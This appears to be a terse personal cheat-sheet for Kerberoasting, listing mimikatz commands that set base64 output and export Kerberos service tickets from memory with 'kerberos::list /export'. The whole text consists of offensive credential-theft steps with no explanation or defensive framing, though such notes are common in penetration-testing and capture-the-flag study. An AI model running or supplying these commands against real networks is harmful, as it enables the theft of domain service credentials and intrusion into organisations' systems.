retriveing from spn/powershell kerbroasting
```
./mimikatz
```
set up mimi
```cmd-session
base64 /out:true
```

Load tickets
```cmd-session
kerberos::list /export 
```